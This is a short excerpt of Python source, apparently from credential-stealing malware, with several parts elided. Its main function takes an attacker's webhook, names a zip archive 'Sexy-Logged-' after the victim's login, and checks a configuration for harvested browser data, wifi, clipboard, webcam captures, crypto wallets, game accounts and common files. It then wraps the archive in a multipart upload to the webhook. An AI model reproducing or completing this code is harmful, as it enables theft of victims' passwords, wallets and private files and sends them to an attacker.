...
def main(webhook: str):
	...
	_file = f'{localappdata}\\Sexy-Logged-{os.getlogin()}.zip'
	...
	if any(__CONFIG__[key] for key in ["browser", "wifi", "common_files", "clipboard", "webcam", "wallets", "games"]):
		with open(_file, 'rb') as file:
			encoder = MultipartEncoder({'payload_json': json.dumps(data), 'file': (f'Sexy-Logged-{os.getlogin()}.zip', file, 'application/zip')})
